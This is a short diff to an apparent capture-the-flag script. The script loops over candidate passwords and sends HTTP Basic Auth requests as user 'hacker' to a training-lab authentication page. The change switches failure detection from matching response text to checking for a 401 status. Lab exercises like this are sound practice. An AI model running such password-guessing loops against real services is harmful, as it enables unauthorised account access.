@@ -16,7 +16,7 @@ def main():
         print(password)
         r = requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                     auth=HTTPBasicAuth('hacker', password))
-        if r.text == "Not authorized":
+        if r.status_code == 401:
             print(r.text)
         else:
             break
